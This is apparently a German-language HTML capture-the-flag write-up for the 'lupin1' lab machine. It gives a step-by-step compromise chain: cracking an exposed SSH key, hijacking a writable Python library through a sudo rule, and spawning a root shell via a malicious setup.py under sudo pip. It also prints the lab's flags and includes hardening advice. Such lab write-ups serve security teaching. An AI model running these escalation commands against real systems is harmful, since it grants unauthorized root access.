+*% .           &&&&&&&&&@&&&&&&&   &  &&(  #&&&&   &&&&.                   % &
+*& *            &&&&&&&&   /*      @%&%&&&&&&&&&    &&&&,                   @ &
+*& &               &&&&&&&           & &&&&&&&&&&     @&&&                   & &
+*& &                    &&&&&        /   /&&&&         &&&                   & &@
+*/(,                      &&                            &                   / &.
+* & &                     &&&       #             &&&&&&      @             & &.
+* .% &                    &&&%&     &    @&&&&&&&&&&.   %@&&*               ( @, 
+/  & %                   .&&&&  &@ @                 &/                    @ &  
+*   & @                  &&&&&&    &&.               ,                    & &   
+*    & &               &&&&&&&&&& &    &&&(          &                   & &    
+,     & %           &&&&&&&&&&&&&&&(       .&&&&&&&  &                  & &     
+,      & .. &&&&&&&&&&&&&&&&&&&&&&&&&*          &  &                & &      
+,       #& & &&&&&&&&&&&&&&&&&&&&&&&&&&&&        &.             %  &       
+,         &  , &&&&&&&&&&&&&&&&&&&&&&&&&&&.     &&&&          @ &*        
+,           & ,, &&&&&&&&&&&&&&&&&&&&&&&&&.  /&&&&&&&&    & &@          
+,             &  & #&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&@ &. &&            
+,               && /# /&&&&&&&&&&&&&&&&&&&&&&&&# &&&# &# #&               
+,                  &&  &( .&&&&&&&&&&&&&&&&&&&&&&&  &&  &&                  
+/                     ,&&(  &&%   *&&&&&&&&&&%   .&&&  /&&,                     
+,                           &&&&&/...         .#&&&&#                           
+
+<span class="password">3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}</span>
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Root-Flag `<span class="password">3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}</span>` (innerhalb der ASCII-Art) wurde erfolgreich gelesen.</p>
+
+        </section>
+
+
+        <section id="poc">
+            <h2>Proof of Concept (POC)</h2>
+             <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser POC beschreibt die Verkettung von Schwachstellen zur Kompromittierung: Finden einer versteckten Datei in einem Benutzerverzeichnis über Web-Enumeration, Dekodieren des Inhalts (Base58) zu einem verschlüsselten SSH-Schlüssel, Knacken der Schlüssel-Passphrase, Login als Benutzer `icex64`, Eskalation zu Benutzer `arsene` durch Hijacking einer Python-Bibliothek über eine `sudo`-Regel und schließlich Eskalation zu Root durch Ausnutzen einer unsicheren `sudo pip`-Berechtigung.</p>
+
+            <h3>POC Schritt 1: Credential Access & Initial Access (icex64)</h3>
+            <p class="analysis"><strong>Schwachstellen:</strong> Informationsleck (Base58-kodierter Key in Web-Verzeichnis), schwache SSH-Key-Passphrase.</p>
+             <p class="analysis"><strong>Schritte:</strong></p>
+             <ol>
+                 <li>Finde Benutzerverzeichnis `/~secret` mit `ffuf`.</li>
+                 <li>Finde versteckte Datei `/~secret/.mysecret.txt` mit `ffuf`.</li>
+                 <li>Lade Dateiinhalt mit `curl` herunter.</li>
+                 <li>Dekodiere Base58-String (CyberChef) -> Erhalte verschlüsselten SSH-Key.</li>
+                 <li>Extrahiere Hash mit `ssh2john idid > idhash`.</li>
+                 <li>Knacke Hash mit `john --wordlist=rockyou.txt idhash` (Passphrase: `P@55w0rd!`).</li>
+                 <li>Login per SSH: `ssh icex64@192.168.2.135 -i idid` (Passphrase eingeben).</li>
+             </ol>
+             <p class="analysis"><strong>Ergebnis:</strong> Shell als Benutzer `icex64`.</p>
+
+             <h3>POC Schritt 2: Privilege Escalation (icex64 zu arsene)</h3>
+             <p class="analysis"><strong>Schwachstellen:</strong> Unsichere Dateiberechtigung (`/usr/lib/python3.9/webbrowser.py` beschreibbar), unsichere `sudo`-Regel (`icex64` darf Skript als `arsene` ausführen).</p>
+             <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `icex64`.</p>
+             <p class="analysis"><strong>Schritte:</strong></p>
+             <ol>
+                 <li>Modifiziere Python-Bibliothek: `nano /usr/lib/python3.9/webbrowser.py` (füge `os.system("/bin/bash")` ein).</li>
+                 <li>Führe das Skript über `sudo` aus: `sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py`.</li>
+             </ol>
+             <p class="analysis"><strong>Ergebnis:</strong> Shell als Benutzer `arsene`.</p>
+
+            <h3>POC Schritt 3: Privilege Escalation (arsene zu root)</h3>
+            <p class="analysis"><strong>Schwachstelle:</strong> Unsichere `sudo`-Regel (`arsene` darf `pip` als Root ausführen).</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `arsene`.</p>
+             <p class="analysis"><strong>Schritte (GTFOBins für pip):</strong></p>
+             <ol>
+                 <li>Wechsle nach `/tmp`: `cd /tmp`.</li>
+                 <li>Erstelle temporäres Verzeichnis: `TF=$(mktemp -d)`.</li>
+                 <li>Erstelle bösartige `setup.py`: `echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py`.</li>
+                 <li>Führe `pip install` mit `sudo` aus: `sudo pip install $TF`.</li>
+             </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Root-Shell.</p>
+            <p class="analysis"><strong>Beweismittel:</strong> Ausführung von `id` zeigt `uid=0(root)`. Lesen von `/root/root.txt` ist möglich.</p>
+
+             <p class="evaluation"><strong>Risikobewertung:</strong> Sehr hoch. Mehrere schwerwiegende Fehlkonfigurationen und Schwachstellen ermöglichen eine Eskalation von einem Informationsleck bis hin zu vollen Root-Rechten: Exposition von Secrets, schwache Passphrasen, falsche Dateiberechtigungen auf Systembibliotheken und extrem unsichere `sudo`-Regeln.</p>
+             <p class="recommendation"><strong>Empfehlungen:**
+*   **Admin:** Secrets niemals im Webroot speichern. Starke Passphrasen erzwingen. Dateiberechtigungen härten (Systembibliotheken dürfen nicht beschreibbar sein). `sudo`-Regeln drastisch einschränken (insbesondere kein `sudo` für Paketmanager oder Skripte, die von anderen Benutzern ausgeführt werden).
+*   **Pentester:** Die Verkettung der Schwachstellen klar aufzeigen.</p>
+
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/icex64/user.txt</div>
+                     <div class="flag-value"><span class="password">3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <!-- ASCII Art wird hier aus Platzgründen weggelassen, Flag darunter -->
+                     <div class="flag-value"><span class="password">3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}</span></div>
+                 </div>
+             </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 10. Oktober 2022</p> <!-- Datum angepasst -->
+    </footer>
+</body>
+</html>
